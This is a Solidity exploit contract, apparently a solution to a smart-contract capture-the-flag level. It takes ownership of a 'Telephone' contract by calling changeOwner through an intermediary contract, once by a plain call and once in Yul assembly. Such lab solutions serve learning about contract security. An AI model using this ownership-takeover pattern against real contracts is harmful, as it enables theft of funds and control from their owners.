// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

interface Telephone {
    function owner() external view returns (address);

    function changeOwner(address _owner) external;
}

contract TelephoneExploit {
    Telephone telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function baseExploit(address owner) public {
        telephone.changeOwner(owner);
    }

    function yulExploit(address owner) public {
        assembly {
            mstore(0, "changeOwner(address)")
            mstore(0, keccak256(0, 20))

            mstore(4, owner)

            let success := call(gas(), sload(telephone.slot), 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
